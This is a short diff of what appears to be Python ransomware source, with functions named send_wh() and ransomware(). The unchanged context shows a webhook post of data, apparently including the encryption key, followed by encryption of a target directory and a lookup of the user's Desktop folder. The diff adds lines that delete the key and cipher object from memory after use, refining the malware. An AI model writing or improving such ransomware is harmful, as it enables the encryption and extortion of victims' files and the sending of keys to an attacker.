@@ -127,6 +127,7 @@ def send_wh():
 
     try:
         requests.post(webhook_url, json=data)
+        del key
     except Exception:
         pass
 
@@ -171,7 +172,10 @@ def ransomware():
 
     send_wh()
     encrypt_directory(target_directory)
+    del cipher_suite
     encrypted_files()
+
+    
 
     try:
         desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
